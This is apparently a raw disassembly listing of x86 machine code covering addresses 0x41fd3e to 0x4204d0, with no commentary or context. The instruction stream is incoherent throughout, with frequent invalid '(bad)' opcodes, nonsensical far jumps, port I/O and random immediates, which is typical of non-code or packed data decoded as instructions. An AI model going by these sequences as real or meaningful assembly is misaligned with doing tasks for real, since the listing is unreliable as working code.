  41fd3e:	jmp    0xde6e:0x11756fe2
  41fd45:	iret   
  41fd46:	imul   ecx,DWORD PTR [ebx+0x5390d00f],0x68700e43
  41fd50:	in     al,0x78
  41fd52:	sbb    al,BYTE PTR ds:0xcb0953c
  41fd58:	and    BYTE PTR [edi+0x33],cl
  41fd5b:	pop    edi
  41fd5c:	lock hlt 
  41fd5e:	in     eax,0x84
  41fd60:	xor    DWORD PTR [ecx],edi
  41fd62:	mov    ebx,0x8cc91f33
  41fd67:	fmul   DWORD PTR [edi]
  41fd69:	sbb    edx,DWORD PTR [esi+edx*8+0xa]
  41fd6d:	add    al,BYTE PTR [edi+0x6c]
  41fd70:	mov    al,ds:0xa5e3241
  41fd75:	test   eax,0x66202525
  41fd7a:	popf   
  41fd7b:	dec    esi
  41fd7c:	cmp    esi,DWORD PTR [ebx-0x7a99fa5d]
  41fd82:	ja     0x41fd8e
  41fd84:	out    0x26,eax
  41fd86:	xchg   ecx,eax
  41fd87:	ss push ss
  41fd89:	pop    edi
  41fd8a:	sbb    BYTE PTR [edx-0x7dd213df],cl
  41fd90:	es jmp 0x41fddf
  41fd93:	cld    
  41fd94:	outs   dx,BYTE PTR ds:[esi]
  41fd95:	aas    
  41fd96:	fadd   st(2),st
  41fd98:	dec    edx
  41fd99:	push   edx
  41fd9a:	push   ss
  41fd9b:	out    0xe5,al
  41fd9d:	jns    0x41fddf
  41fd9f:	and    al,0x5a
  41fda1:	test   DWORD PTR [esi+0x56615f0d],ebx
  41fda7:	adc    eax,0x20a51e9f
  41fdac:	rcl    DWORD PTR [eax+edx*1+0x1f798d8f],0x84
  41fdb4:	inc    BYTE PTR [edx]
  41fdb6:	rcr    BYTE PTR [ebp+0x1b],1
  41fdb9:	push   0x7c4be733
  41fdbe:	(bad)  
  41fdbf:	cwde   
  41fdc0:	xchg   edx,eax
  41fdc1:	mov    al,ds:0xcdf5d0d2
  41fdc6:	ret    
  41fdc7:	bound  ebp,QWORD PTR [eax]
  41fdc9:	ds xor al,0x8e
  41fdcc:	mov    dl,0xf3
  41fdce:	cld    
  41fdcf:	jb     0x41fe3a
  41fdd1:	cmp    edi,DWORD PTR ds:0x3a1af732
  41fdd7:	jp     0x41fdb3
  41fdd9:	daa    
  41fdda:	(bad)  
  41fddc:	add    bh,BYTE PTR ds:0xe28bac50
  41fde2:	pop    ds
  41fde3:	mov    bl,0x60
  41fde5:	jns    0x41fddd
  41fde7:	add    eax,0x1671a1ab
  41fdec:	in     al,dx
  41fded:	js     0x41fd9c
  41fdef:	xchg   edi,eax
  41fdf0:	cmp    eax,0x324f1e38
  41fdf5:	(bad)  
  41fdf6:	cmp    al,BYTE PTR [ebx]
  41fdf8:	push   DWORD PTR [eax]
  41fdfa:	mov    BYTE PTR [ebp-0x67],0xd3
  41fdfe:	xchg   edi,eax
  41fdff:	retf   0xbaf9
  41fe02:	sar    BYTE PTR [esi-0x12],cl
  41fe05:	in     al,dx
  41fe06:	fcom   DWORD PTR [ebx+ebp*1-0x76]
  41fe0a:	or     dh,al
  41fe0c:	mov    edx,edi
  41fe0e:	dec    eax
  41fe0f:	test   BYTE PTR [eax+0xc],dl
  41fe12:	or     DWORD PTR [eax],0x641bd693
  41fe18:	cld    
  41fe19:	les    esi,FWORD PTR ds:0xfb5d755
  41fe1f:	les    eax,FWORD PTR ds:0x98f8613a
  41fe25:	adc    ebx,DWORD PTR [edi]
  41fe27:	in     al,dx
  41fe28:	xchg   esi,eax
  41fe29:	ja     0x41fe86
  41fe2b:	sar    BYTE PTR [ebx+0x5cb8c5c],cl
  41fe31:	pop    ecx
  41fe32:	pusha  
  41fe33:	push   edi
  41fe34:	xchg   esp,eax
  41fe35:	(bad)  
  41fe36:	jecxz  0x41fde8
  41fe38:	ins    BYTE PTR es:[edi],dx
  41fe39:	mov    bh,0xa8
  41fe3b:	ds ja  0x41fe9d
  41fe3e:	xor    BYTE PTR [edi+0x5a],cl
  41fe41:	xchg   edi,eax
  41fe42:	imul   eax,edx,0xfffffff7
  41fe45:	add    al,0x4
  41fe47:	pop    ecx
  41fe48:	and    ch,BYTE PTR [eax]
  41fe4a:	jl     0x41fe33
  41fe4c:	xchg   esp,eax
  41fe4d:	out    dx,al
  41fe4e:	mov    edi,0x7e7f8633
  41fe53:	mov    DWORD PTR [esi+eax*8],edi
  41fe56:	mov    al,ds:0x4b2112d
  41fe5b:	es mov esi,0x7b91636
  41fe61:	imul   edi,ecx,0xc2c42ef5
  41fe67:	call   0xfd6d60a9
  41fe6c:	dec    edi
  41fe6d:	mov    ah,0xff
  41fe6f:	push   esi
  41fe70:	jbe    0x41fe28
  41fe72:	sbb    BYTE PTR [esi+0x3568b4e0],bl
  41fe78:	sbb    edx,DWORD PTR [edi-0x1b]
  41fe7b:	shl    BYTE PTR [edx-0x64],1
  41fe7e:	push   esp
  41fe7f:	popa   
  41fe80:	sub    ebp,edx
  41fe82:	clc    
  41fe83:	je     0x41fe80
  41fe85:	and    eax,0x201e0cd3
  41fe8a:	or     al,BYTE PTR [ebx+0x14]
  41fe8d:	adc    DWORD PTR [eax+edx*2-0x67d8d5ad],edi
  41fe94:	mov    ebp,ebx
  41fe96:	push   esp
  41fe97:	stos   BYTE PTR es:[edi],al
  41fe98:	push   ss
  41fe99:	mov    esi,0x3b7d0428
  41fe9e:	(bad)  
  41fe9f:	fidiv  WORD PTR [eax-0x72]
  41fea2:	xor    eax,0x77828c7a
  41fea7:	loop   0x41fe60
  41fea9:	and    al,0xd2
  41feab:	fwait
  41feac:	jmp    0x9fa4500d
  41feb1:	popf   
  41feb2:	lea    esi,[eax]
  41feb4:	out    dx,al
  41feb5:	adc    bh,ch
  41feb7:	sub    esi,DWORD PTR [edi+0x28]
  41feba:	inc    esi
  41febb:	test   esi,0x440a7524
  41fec1:	push   0x13e08c89
  41fec6:	sbb    al,0x11
  41fec8:	test   BYTE PTR [eax-0x79f25990],dl
  41fece:	or     al,0x1
  41fed0:	mov    ebx,DWORD PTR [ecx]
  41fed2:	(bad)  
  41fed3:	xchg   esi,eax
  41fed4:	xor    eax,0x7a11ec8
  41fed9:	ins    DWORD PTR es:[edi],dx
  41feda:	inc    edx
  41fedb:	or     dl,cl
  41fedd:	(bad)  
  41fede:	sbb    BYTE PTR [ecx-0x42],dl
  41fee1:	fs add esp,ebp
  41fee4:	xchg   BYTE PTR [ecx+esi*2+0x20582954],dh
  41feeb:	push   ebx
  41feec:	mov    dl,0x5d
  41feee:	test   al,0x99
  41fef0:	mov    edx,0x73fbf26e
  41fef5:	push   eax
  41fef6:	jp     0x41fe8d
  41fef8:	xchg   edi,eax
  41fef9:	(bad)  
  41fefa:	sbb    DWORD PTR [ecx],ebx
  41fefc:	pop    edx
  41fefd:	cdq    
  41fefe:	mov    bh,0x2
  41ff00:	and    al,0x31
  41ff02:	hlt    
  41ff03:	or     ebx,DWORD PTR [edx]
  41ff05:	pop    ebx
  41ff06:	int    0x40
  41ff08:	stc    
  41ff09:	jecxz  0x41ff00
  41ff0b:	sub    BYTE PTR [edx+0x75],ah
  41ff0e:	out    dx,al
  41ff0f:	mov    bl,0x36
  41ff11:	or     dh,BYTE PTR [ebx+edx*8]
  41ff14:	or     DWORD PTR [esp+ebp*4-0x14],ecx
  41ff18:	out    dx,eax
  41ff19:	push   0x8a958471
  41ff1e:	sub    eax,0x2ccb0629
  41ff23:	ror    DWORD PTR [esi],0x73
  41ff26:	les    eax,FWORD PTR [ebp+0x3]
  41ff29:	pop    es
  41ff2a:	sub    edx,esp
  41ff2c:	xlat   BYTE PTR ds:[ebx]
  41ff2d:	push   ds
  41ff2e:	test   eax,0xcc0c24c1
  41ff33:	out    0x97,eax
  41ff35:	fistp  WORD PTR [ebx+eax*1-0x14]
  41ff39:	and    dl,bl
  41ff3b:	pop    es
  41ff3c:	mov    cl,0x36
  41ff3e:	fwait
  41ff3f:	dec    esp
  41ff40:	xchg   edx,eax
  41ff41:	sahf   
  41ff42:	lods   eax,DWORD PTR ds:[esi]
  41ff43:	test   DWORD PTR [eax-0x103e8cdb],esi
  41ff49:	pop    es
  41ff4a:	dec    ebx
  41ff4b:	out    0x42,eax
  41ff4d:	jae    0x41ff40
  41ff4f:	imul   ebx,DWORD PTR [ebx+0x1],0x4
  41ff53:	jecxz  0x41ff66
  41ff55:	test   edi,esp
  41ff57:	les    edx,FWORD PTR [ebp-0x14]
  41ff5a:	mov    ah,cl
  41ff5c:	jge    0x41ffd9
  41ff5e:	inc    esi
  41ff5f:	sbb    DWORD PTR [edx-0x56dc7411],ebp
  41ff65:	stos   DWORD PTR es:[edi],eax
  41ff66:	sub    al,0x56
  41ff68:	xor    DWORD PTR [esp+esi*4+0x52280f49],0xc3f7eafb
  41ff73:	mov    cl,0xf3
  41ff75:	out    0xd6,al
  41ff77:	retf   
  41ff78:	loop   0x41ff4d
  41ff7a:	hlt    
  41ff7b:	push   ebx
  41ff7c:	mov    dh,0x1a
  41ff7e:	aam    0xdc
  41ff80:	dec    ecx
  41ff81:	push   edx
  41ff82:	push   ecx
  41ff83:	lock jg 0x41ff22
  41ff86:	push   esp
  41ff87:	or     DWORD PTR [ecx-0xf35cd05],eax
  41ff8d:	mov    BYTE PTR [edx-0xadeae22],ch
  41ff93:	cmp    al,0x8d
  41ff95:	and    ecx,DWORD PTR [edx+0x2c435f4d]
  41ff9b:	pop    es
  41ff9c:	clc    
  41ff9d:	popf   
  41ff9e:	adc    al,0x93
  41ffa0:	dec    ecx
  41ffa1:	ins    BYTE PTR es:[edi],dx
  41ffa2:	cmp    DWORD PTR [esp+ebx*1-0x370c8753],ecx
  41ffa9:	imul   edi,DWORD PTR [ebp-0x75779535],0xf676092a
  41ffb3:	inc    ebp
  41ffb4:	cmp    eax,0x3f14d65e
  41ffb9:	ja     0x420028
  41ffbb:	mov    bl,0x93
  41ffbd:	jo     0x420025
  41ffbf:	mov    esp,0x3ca2c2a7
  41ffc4:	aaa    
  41ffc5:	mov    eax,0x2b74b496
  41ffca:	sahf   
  41ffcb:	mov    ah,0x19
  41ffcd:	pushf  
  41ffce:	and    al,ah
  41ffd0:	outs   dx,BYTE PTR ds:[esi]
  41ffd1:	in     eax,0xf9
  41ffd3:	ds push esi
  41ffd5:	pop    esp
  41ffd6:	or     BYTE PTR [esi-0x1eefd9c0],dh
  41ffdc:	inc    esp
  41ffdd:	xchg   edx,eax
  41ffde:	mov    edx,0xb1dddd58
  41ffe3:	cmp    BYTE PTR [edx],0x1a
  41ffe6:	stc    
  41ffe7:	xchg   ebx,eax
  41ffe8:	jae    0x41ff7c
  41ffea:	sbb    BYTE PTR gs:[edi],bh
  41ffed:	mov    bl,0xae
  41ffef:	call   0x8f11639a
  41fff4:	mov    ah,0xce
  41fff6:	jbe    0x420023
  41fff8:	jp     0x41ff7d
  41fffa:	dec    ebp
  41fffb:	sbb    dl,ch
  41fffd:	and    al,0x32
  41ffff:	sub    ch,BYTE PTR [esp+edx*1+0x3b8d2ad9]
  420006:	scas   eax,DWORD PTR es:[edi]
  420007:	dec    edi
  420008:	pop    ss
  420009:	dec    edx
  42000a:	pop    eax
  42000b:	aaa    
  42000c:	mov    WORD PTR [ecx-0x65],fs
  42000f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420010:	cwde   
  420011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420012:	in     al,0xdb
  420014:	popa   
  420015:	mov    BYTE PTR [ebx+0x450197a4],al
  42001b:	rcr    esi,0x7c
  42001e:	mov    BYTE PTR [esi+0x793ddb3d],ch
  420024:	rcr    eax,1
  420026:	fild   WORD PTR [eax-0x239a4f99]
  42002c:	sub    dl,BYTE PTR [esi-0x281d4c91]
  420032:	stos   DWORD PTR es:[edi],eax
  420033:	cld    
  420034:	sahf   
  420035:	pop    ecx
  420036:	call   0x4868e742
  42003b:	je     0x41ffd1
  42003d:	imul   BYTE PTR [edx-0x5d]
  420040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420041:	cmp    al,0xb7
  420043:	(bad)  
  420044:	push   ss
  420045:	xor    al,BYTE PTR [edx-0x12]
  420048:	mov    al,0x55
  42004a:	sub    eax,0x95ae8493
  42004f:	aas    
  420050:	inc    eax
  420051:	push   ecx
  420052:	cld    
  420053:	mov    ebx,0x4b880026
  420058:	inc    ebx
  420059:	and    BYTE PTR [esp+edx*4-0x1efefdfa],bh
  420060:	push   0xbdb5c73b
  420065:	ss test DWORD PTR ss:[edi],ecx
  420069:	(bad)  
  42006a:	leave  
  42006b:	out    0x5,eax
  42006d:	into   
  42006e:	lock lock in eax,0xfa
  420072:	add    eax,0x54f9dda4
  420077:	jb     0x42007b
  420079:	ja     0x420087
  42007b:	dec    ecx
  42007c:	sbb    al,0xb8
  42007e:	(bad)  
  420080:	cmp    eax,DWORD PTR [ebx-0x53]
  420083:	jnp    0x42003b
  420085:	lock pop ebp
  420087:	mov    DWORD PTR [ecx-0x66562778],esi
  42008d:	push   esp
  42008e:	ja     0x42002e
  420090:	xchg   esi,eax
  420091:	or     al,0x5a
  420093:	int3   
  420094:	add    edx,esp
  420096:	adc    ebp,esp
  420098:	sub    ebx,DWORD PTR [ebp-0x53]
  42009b:	fmul   st(5),st
  42009d:	mov    ds:0x9ab29f1e,al
  4200a2:	adc    al,0xae
  4200a4:	out    0xa9,eax
  4200a6:	jbe    0x420036
  4200a8:	sbb    al,BYTE PTR [esi+0x25]
  4200ab:	sbb    BYTE PTR [ebx],ah
  4200ad:	stos   BYTE PTR es:[edi],al
  4200ae:	lea    ebx,[edx+eax*8]
  4200b1:	imul   edi,DWORD PTR [esi+ecx*1+0x20b87e06],0x4c
  4200b9:	pop    DWORD PTR [edx-0x679fa0cb]
  4200bf:	xchg   edx,eax
  4200c0:	and    al,0x62
  4200c2:	outs   dx,BYTE PTR ds:[esi]
  4200c3:	xor    esi,DWORD PTR [esi+edi*8+0x52ed9119]
  4200ca:	jmp    0x42010e
  4200cc:	push   ebx
  4200cd:	adc    eax,0xd59e008f
  4200d2:	add    BYTE PTR [eax],ah
  4200d4:	aaa    
  4200d5:	test   al,ah
  4200d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200d8:	das    
  4200d9:	add    edi,ebp
  4200db:	retf   
  4200dc:	push   esi
  4200dd:	lea    ebx,[esp+ecx*2-0x20]
  4200e1:	push   ebx
  4200e2:	ins    BYTE PTR es:[edi],dx
  4200e3:	shr    DWORD PTR [ecx],cl
  4200e5:	xchg   DWORD PTR [esi],edx
  4200e7:	js     0x4200ef
  4200e9:	aam    0x29
  4200eb:	xchg   DWORD PTR [edi],eax
  4200ed:	pop    es
  4200ee:	fisub  WORD PTR [edi-0x31]
  4200f1:	sti    
  4200f2:	xor    eax,0xf082d918
  4200f7:	cmovg  esp,DWORD PTR [eax]
  4200fa:	sar    ch,cl
  4200fc:	std    
  4200fd:	mov    edx,0x38306c60
  420102:	mov    bh,0x98
  420104:	pop    eax
  420105:	cs ins BYTE PTR es:[edi],dx
  420107:	lds    ebx,FWORD PTR [ebx-0x2064d841]
  42010d:	retf   
  42010e:	adc    esi,edi
  420110:	inc    esp
  420111:	fs es loopne 0x4200f6
  420115:	jne    0x4200d5
  420117:	dec    esp
  420118:	loop   0x42014e
  42011a:	cmp    DWORD PTR [esi],ecx
  42011c:	repnz xor ch,0x97
  420120:	loope  0x420118
  420122:	shl    BYTE PTR [ecx+0x607f2e52],cl
  420128:	jge    0x4200c1
  42012a:	arpl   bx,ax
  42012c:	adc    eax,edi
  42012e:	push   0xd8697d2d
  420133:	and    bh,BYTE PTR [ebp+edx*1-0x2b]
  420137:	rcl    eax,0x84
  42013a:	and    DWORD PTR [esi+edi*2+0x1],ecx
  42013e:	je     0x420128
  420140:	jge    0x4201b3
  420142:	mov    BYTE PTR [ebx],bl
  420144:	addr16 mov esi,0x4470daf5
  42014a:	cdq    
  42014b:	(bad)  [ecx+edx*8]
  42014e:	cmp    DWORD PTR [ebp-0x697032f1],eax
  420154:	mov    esp,DWORD PTR [ebx+0xe040a9e]
  42015a:	mov    bl,0xb0
  42015c:	cdq    
  42015d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42015e:	jae    0x420158
  420160:	cmc    
  420161:	add    dh,bl
  420163:	iret   
  420164:	or     BYTE PTR [ecx],0xa6
  420167:	adc    dh,0x7
  42016a:	jns    0x420161
  42016c:	addr16 xchg ecx,eax
  42016e:	arpl   WORD PTR [eax],sp
  420170:	pusha  
  420171:	retf   
  420172:	dec    ebp
  420173:	(bad)
  420176:	rcl    DWORD PTR [esi],cl
  420178:	and    ebx,DWORD PTR [ecx+0x7d7f21b2]
  42017e:	push   cs
  42017f:	lahf   
  420180:	pop    edx
  420181:	(bad)  
  420182:	dec    esp
  420183:	loopne 0x420116
  420185:	inc    ebx
  420186:	mov    esp,0xce3fe707
  42018b:	pushf  
  42018c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42018d:	aaa    
  42018e:	or     bl,BYTE PTR [ebx]
  420190:	scas   al,BYTE PTR es:[edi]
  420191:	stos   BYTE PTR es:[edi],al
  420192:	jmp    0x385a:0xd28aa530
  420199:	xchg   esi,eax
  42019a:	inc    ecx
  42019b:	push   0xc9c9faa2
  4201a0:	sub    bl,BYTE PTR [edi]
  4201a2:	(bad)  
  4201a3:	sar    DWORD PTR [edi+ebp*8+0x3b],1
  4201a7:	sbb    DWORD PTR [esi-0x1e21e2de],ebp
  4201ad:	xor    al,cl
  4201af:	lahf   
  4201b0:	sahf   
  4201b1:	into   
  4201b2:	cmp    ch,BYTE PTR [ebx]
  4201b4:	int3   
  4201b5:	cwde   
  4201b6:	dec    ebx
  4201b7:	aad    0x90
  4201b9:	ins    DWORD PTR es:[edi],dx
  4201ba:	push   esi
  4201bb:	fcom   QWORD PTR [edi-0x74]
  4201be:	aam    0x76
  4201c0:	sahf   
  4201c1:	inc    esp
  4201c2:	pushf  
  4201c3:	mov    BYTE PTR [esp+eax*4-0x2c],ch
  4201c7:	push   ss
  4201c8:	inc    ebp
  4201c9:	sti    
  4201ca:	aas    
  4201cb:	lods   eax,DWORD PTR ds:[esi]
  4201cc:	jg     0x4201db
  4201ce:	rcl    eax,1
  4201d0:	fmul   DWORD PTR [edi]
  4201d2:	jp     0x420190
  4201d4:	pop    edi
  4201d5:	rcr    BYTE PTR [esi+eax*4-0x24],cl
  4201d9:	out    0x54,al
  4201db:	pop    ebx
  4201dc:	lods   al,BYTE PTR ds:[esi]
  4201dd:	into   
  4201de:	inc    ecx
  4201df:	mov    dl,0x3a
  4201e1:	pop    edx
  4201e2:	stos   DWORD PTR es:[edi],eax
  4201e3:	adc    al,0x18
  4201e5:	pslld  mm4,QWORD PTR [ecx-0x3a]
  4201e9:	sub    BYTE PTR [eax-0x6],0xc7
  4201ed:	ins    DWORD PTR es:[edi],dx
  4201ee:	in     al,dx
  4201ef:	push   ebx
  4201f0:	push   0x73
  4201f2:	adc    al,0x11
  4201f4:	jmp    0x420205
  4201f6:	mov    ah,0xc4
  4201f8:	xchg   dx,ax
  4201fa:	imul   esp,DWORD PTR [ebx],0x29
  4201fd:	test   DWORD PTR [edi+0x49],esi
  420200:	lds    ebp,FWORD PTR [edx]
  420202:	sahf   
  420203:	mov    eax,0x4303b4e9
  420208:	scas   eax,DWORD PTR es:[edi]
  420209:	and    DWORD PTR [edx-0x2813240d],ebx
  42020f:	ins    BYTE PTR es:[edi],dx
  420210:	cwde   
  420211:	mov    edi,0x25b7c6b4
  420216:	retf   
  420217:	jae    0x4201ba
  420219:	fidiv  WORD PTR [eax]
  42021b:	gs push ebx
  42021d:	ins    DWORD PTR es:[edi],dx
  42021e:	ins    BYTE PTR es:[edi],dx
  42021f:	jae    0x420296
  420221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420222:	dec    ebp
  420223:	sbb    al,0xf
  420225:	xchg   ecx,eax
  420226:	arpl   WORD PTR [ebp+0x0],cx
  420229:	or     dh,dl
  42022b:	es (bad) 
  42022d:	mov    ch,0x80
  42022f:	das    
  420230:	add    DWORD PTR [esi+0x3c],esp
  420233:	add    BYTE PTR [edi+0x15804b8d],dh
  420239:	dec    edx
  42023a:	cld    
  42023b:	fucomip st,st(2)
  42023d:	and    eax,0x839b57d5
  420242:	vaddsubps ymm0,ymm4,YMMWORD PTR [ecx]
  420246:	call   0x66ec:0xf166c639
  42024d:	jmp    0x961b8cb2
  420252:	(bad)  
  420253:	push   ebx
  420254:	ror    BYTE PTR [ebx-0x1f],cl
  420257:	sbb    al,BYTE PTR [edx-0x41c4587d]
  42025d:	mov    dh,0x34
  42025f:	(bad)  
  420260:	clc    
  420261:	cmp    DWORD PTR ds:[eiz*4-0x2eafd05d],0x50
  42026a:	pop    edx
  42026b:	sbb    bl,ah
  42026d:	gs cmp al,0xe8
  420270:	or     BYTE PTR [eax+0x7d4a6bab],al
  420276:	xor    ecx,0xd82d27c4
  42027c:	xchg   DWORD PTR [ecx],ebp
  42027e:	dec    edi
  42027f:	or     eax,0x19bed69d
  420284:	loope  0x4202cf
  420286:	jl     0x4202ad
  420288:	vminpd xmm0,xmm1,XMMWORD PTR [edi+eax*2]
  42028d:	out    dx,al
  42028e:	div    bl
  420290:	push   0x6f460605
  420295:	sbb    BYTE PTR [edi+0x1ed4e917],bl
  42029b:	jge    0x420302
  42029d:	adc    DWORD PTR [edi-0x2c9ebda6],ebp
  4202a3:	ins    BYTE PTR es:[edi],dx
  4202a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202a6:	fnstsw WORD PTR [eax+ebp*1-0x13]
  4202aa:	xor    al,0xad
  4202ac:	aaa    
  4202ad:	add    eax,0x162d0709
  4202b2:	dec    ebp
  4202b3:	sti    
  4202b4:	clc    
  4202b5:	push   esp
  4202b6:	xchg   esp,eax
  4202b7:	push   ecx
  4202b8:	bound  edi,QWORD PTR [edx+ebx*2]
  4202bb:	or     BYTE PTR [ebx-0x71c1a478],ch
  4202c1:	xchg   edi,eax
  4202c2:	sub    bp,cx
  4202c5:	test   al,0xb8
  4202c7:	add    edi,DWORD PTR [edx]
  4202c9:	jge    0x420338
  4202cb:	jb     0x4202fe
  4202cd:	mov    dl,0x80
  4202cf:	es (bad) 
  4202d1:	cmp    al,0x7e
  4202d3:	push   es
  4202d4:	stc    
  4202d5:	mov    edi,0x3b0396dc
  4202da:	sbb    al,0x24
  4202dc:	mov    ah,0x99
  4202de:	push   edi
  4202df:	dec    esi
  4202e0:	mov    dl,0xa5
  4202e2:	idiv   cl
  4202e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202e5:	xchg   ebp,eax
  4202e6:	pop    edi
  4202e7:	mov    ch,0x20
  4202e9:	aaa    
  4202ea:	mov    eax,0x781e562f
  4202ef:	xchg   DWORD PTR [edi+edx*8+0x173ecf53],esi
  4202f6:	cs rcl ebx,cl
  4202f9:	nop
  4202fa:	dec    ebx
  4202fb:	nop
  4202fc:	std    
  4202fd:	or     ebp,DWORD PTR [edi-0x38]
  420300:	punpckldq mm6,DWORD PTR [ebx-0xa]
  420304:	mov    ah,0xf4
  420306:	imul   DWORD PTR [edx-0x7107ecbf]
  42030c:	and    cl,BYTE PTR [edi]
  42030e:	jo     0x42036e
  420310:	pop    ss
  420311:	cmc    
  420312:	rol    BYTE PTR [esp+ebx*2],cl
  420315:	mov    dl,0x7
  420317:	sbb    eax,0xe80a9f1a
  42031c:	test   eax,0xb804e27a
  420321:	out    dx,al
  420322:	pop    DWORD PTR [ecx+ebp*2-0x77]
  420326:	gs lahf 
  420328:	inc    ecx
  420329:	ins    BYTE PTR es:[edi],dx
  42032a:	rcl    DWORD PTR ds:0x72f75a83,1
  420330:	pop    ebp
  420331:	jbe    0x4202ca
  420333:	jbe    0x4202f6
  420335:	addr16 das 
  420337:	loope  0x4202e3
  420339:	add    ebx,DWORD PTR [esi+0x2c20155c]
  42033f:	xchg   ecx,eax
  420340:	mov    WORD PTR [edi],gs
  420342:	push   ebp
  420343:	inc    ebx
  420344:	cmp    BYTE PTR [eax+0x12904997],0xbb
  42034b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42034c:	dec    edx
  42034d:	jge    0x4203bd
  42034f:	dec    esi
  420350:	scas   al,BYTE PTR es:[edi]
  420351:	xor    ebx,DWORD PTR ds:0xb9508280
  420357:	out    dx,al
  420358:	call   0x645c:0xf4b9d72c
  42035f:	or     esi,DWORD PTR ds:0x2b3e8857
  420365:	push   es
  420366:	jmp    0xd34f:0x8cfe2a7a
  42036d:	loopne 0x4203d2
  42036f:	shl    DWORD PTR [eax-0x7a9bcd03],1
  420375:	jne    0x42039d
  420377:	test   eax,0xc8dedc9c
  42037c:	(bad)  
  42037d:	or     al,0x6c
  42037f:	cmp    eax,0xfa226344
  420384:	bound  esp,QWORD PTR [eax-0x34]
  420387:	mov    esi,DWORD PTR [edx-0x20]
  42038a:	adc    ch,BYTE PTR [ecx+0x7554fc81]
  420390:	out    0x68,eax
  420392:	int3   
  420393:	fabs   
  420395:	dec    ebp
  420396:	mov    ds:0x3fe63985,eax
  42039b:	jo     0x420414
  42039d:	div    ch
  42039f:	inc    ebx
  4203a0:	loope  0x42039e
  4203a2:	pop    esp
  4203a3:	repz les ebp,FWORD PTR ss:[eax-0x70]
  4203a8:	jbe    0x4203e9
  4203aa:	dec    ebx
  4203ab:	outs   dx,DWORD PTR ds:[esi]
  4203ac:	xlat   BYTE PTR ds:[ebx]
  4203ad:	dec    esi
  4203ae:	xor    al,0xb8
  4203b0:	shr    BYTE PTR [esi],cl
  4203b2:	aam    0xe5
  4203b4:	mov    al,0x9
  4203b6:	les    esp,FWORD PTR [ebx]
  4203b8:	add    bh,BYTE PTR [edi]
  4203ba:	mov    ebx,es
  4203bc:	xchg   esp,eax
  4203bd:	jecxz  0x42038d
  4203bf:	jnp    0x42037b
  4203c1:	(bad)
  4203c5:	lahf   
  4203c6:	gs mov bl,0x39
  4203c9:	add    cl,BYTE PTR ds:0x7bb30819
  4203cf:	xor    ecx,DWORD PTR [ebx-0x2765cd41]
  4203d5:	fbstp  TBYTE PTR [ecx]
  4203d7:	and    DWORD PTR [ebp+0x7f],ebp
  4203da:	mov    al,bl
  4203dc:	or     dh,BYTE PTR es:[edi+eax*4]
  4203e0:	xor    edi,eax
  4203e2:	add    BYTE PTR [ebx*8-0x31e2a189],bh
  4203e9:	mov    DWORD PTR [esi],edx
  4203eb:	sub    edx,DWORD PTR [eax-0x62a99396]
  4203f1:	(bad)  
  4203f2:	jmp    0x420404
  4203f4:	xchg   ecx,eax
  4203f5:	call   0x66aacf59
  4203fa:	add    dl,BYTE PTR [edi+0x1dae68f0]
  420400:	repz adc al,bl
  420403:	loopne 0x420397
  420405:	xchg   ecx,eax
  420406:	jns    0x42046a
  420408:	jmp    0x35540688
  42040d:	fiadd  WORD PTR [ecx]
  42040f:	add    al,0x74
  420411:	(bad)  
  420412:	push   ebx
  420413:	sub    esi,DWORD PTR [edi]
  420415:	pop    ebp
  420416:	leave  
  420417:	into   
  420418:	push   ds
  420419:	xor    BYTE PTR [ebx+0x19e64e15],ah
  42041f:	(bad)  
  420420:	jp     0x42040a
  420422:	and    DWORD PTR [eax],eax
  420424:	lods   eax,DWORD PTR ds:[esi]
  420425:	(bad)  
  420426:	pop    ebx
  420427:	dec    ebp
  420428:	cmp    ah,bh
  42042a:	aas    
  42042b:	(bad)  
  42042c:	push   ss
  42042d:	pop    esp
  42042e:	por    mm1,QWORD PTR [edx+ecx*8-0x5d117857]
  420436:	push   esp
  420437:	popa   
  420438:	xor    DWORD PTR [ebp-0x5e],ecx
  42043b:	dec    esi
  42043c:	xor    eax,0x84183d1b
  420441:	mov    BYTE PTR [edx-0x46658e38],bl
  420447:	mov    ebx,0x15b69dbb
  42044c:	sbb    al,0xe9
  42044e:	std    
  42044f:	out    0x90,eax
  420451:	push   esp
  420452:	jp     0x4203f7
  420454:	sbb    ebx,eax
  420456:	mov    ebx,0x9dce6592
  42045b:	sub    dl,cl
  42045d:	pop    esp
  42045e:	push   edx
  42045f:	stos   BYTE PTR es:[edi],al
  420460:	jb     0x4204a0
  420462:	and    al,0xd8
  420464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420465:	fs out 0x2,al
  420468:	cld    
  420469:	sahf   
  42046a:	iret   
  42046b:	scas   al,BYTE PTR es:[edi]
  42046c:	in     al,dx
  42046d:	jne    0x42043d
  42046f:	sbb    eax,0x22f6700a
  420474:	and    eax,0xfb1dcd64
  420479:	xor    BYTE PTR [esi-0x13fc3d2d],ch
  42047f:	lock sahf 
  420481:	sti    
  420482:	iret   
  420483:	push   ds
  420484:	mov    gs,WORD PTR [edi]
  420486:	add    eax,0xc42f0741
  42048b:	mov    dh,0x1e
  42048d:	addr16 dec ebx
  42048f:	xchg   ebp,eax
  420490:	mov    ebp,0xa4e870ca
  420495:	jp     0x420493
  420497:	mov    esi,0x43d8ca3f
  42049c:	and    DWORD PTR [edx+0x54],ecx
  42049f:	pop    ss
  4204a0:	mov    esp,0x734f07bb
  4204a5:	fild   QWORD PTR [ecx]
  4204a7:	mov    ds,WORD PTR [ebx+0x15237441]
  4204ad:	adc    ah,dl
  4204af:	adc    al,0x14
  4204b1:	pop    esi
  4204b2:	mov    eax,0x7b627782
  4204b7:	sbb    al,0xd7
  4204b9:	or     al,dh
  4204bb:	add    eax,0x6d661f42
  4204c0:	enter  0x239d,0x85
  4204c4:	mov    dl,0x99
  4204c6:	push   ecx
  4204c7:	pop    ss
  4204c8:	sub    esp,DWORD PTR [ecx-0x7]
  4204cb:	not    BYTE PTR [edi+ebp*8]
  4204ce:	arpl   di,si
  4204d0:	pop    ebx
